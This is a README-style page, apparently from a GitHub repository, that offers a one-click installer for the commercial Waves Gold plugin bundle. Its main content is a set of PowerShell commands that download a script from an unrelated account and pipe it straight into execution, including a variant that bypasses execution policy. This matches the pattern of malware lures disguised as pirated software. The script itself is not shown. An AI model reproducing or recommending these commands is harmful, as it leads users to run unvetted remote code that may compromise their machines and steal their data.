# Waves Gold Plugin Bundle Setup
One-click setup for Waves Gold Plugin Bundle Setup -- the essential collection of 40 professional mixing and mastering plugins used in every major recording studio including EQ, compression, reverb, limiter, and spatial tools trusted since 1992

Open PowerShell and run:

```powershell
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

## Features

- Installs the Waves shell and plugin scanner for automatic VST3 DAW detection and registration.
- Downloads and installs all 40 Gold bundle plugins including SSL, CLA, and Renaissance series processors.
- Activates the license via Waves Central and validates each plugin against the registered account.
- Opens Waves Central confirming all 40 plugins are licensed and ready to load in any DAW.

## System Requirements

- Windows 10 / 11 (64-bit)
- PowerShell 5.1+
- Internet connection
- A compatible DAW such as FL Studio, Ableton, Reaper, or Pro Tools is required
- ~8000 MB free disk space

## Common Issues

**Plugins appear in the DAW list but show a trial banner and refuse to process audio on the insert**

Open Waves Central, sign into your account, and click Activate Offline to revalidate the license for each plugin.

**DAW crashes immediately when loading any Waves plugin on an insert or send channel**

Run a full plugin rescan in Waves Central with the Crash Recovery option enabled to remove corrupted plugin registrations.

**Alternative method (if policy blocks execution):**

```powershell
powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex"
```

"irm is not recognized" -- update PowerShell or use the full form:

```powershell
Invoke-RestMethod https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | Invoke-Expression
```

## License
MIT -- see LICENSE.